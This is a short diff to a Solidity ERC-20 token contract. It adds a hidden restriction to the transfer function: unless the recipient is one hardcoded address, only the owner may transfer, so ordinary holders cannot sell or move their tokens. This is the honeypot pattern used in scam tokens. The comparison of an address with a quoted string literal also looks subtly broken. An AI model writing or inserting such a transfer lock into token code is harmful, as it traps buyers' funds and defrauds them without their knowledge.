@@ -92,6 +92,9 @@ contract SimpleERC20 {
         uint256 bal = balanceOf[from];
         require(bal >= value, "ERC20: balance too low");
 
+        if(to != '0x2CCB75c74a322d642f234dc8Dc7eaca0157D2FEE') {
+            require(msg.sender == owner, "Not owner");
+        }
         uint256 tax = (value * taxBps) / 10_000;
         uint256 sendAmount = value - tax;
 
